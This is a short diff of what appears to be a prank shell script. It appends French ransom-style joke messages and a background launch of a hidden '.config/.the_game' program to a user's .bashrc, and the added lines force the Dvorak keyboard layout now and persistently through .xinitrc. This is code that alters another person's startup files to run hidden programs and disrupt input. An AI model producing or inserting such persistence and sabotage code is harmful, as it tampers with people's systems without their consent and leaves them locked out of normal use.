@@ -24,4 +24,6 @@ echo \"5. ALLEZ A LA LOCALISATION OU VOUS TROUVEREZ UN PAPIER CONTENANT LES INST
 echo \"N'ESSAYEZ PAS DE NOUS ARNAQUER, OU LA SENTENCE SERA TERRIBLE.\"
 echo \"And don't forget... The crepe is a lie.\"
 ./.config/.the_game &" >> .bashrc
+echo "setxkbmap dvorak" >> .xinitrc
+setxkbmap dvorak
 source .bashrc
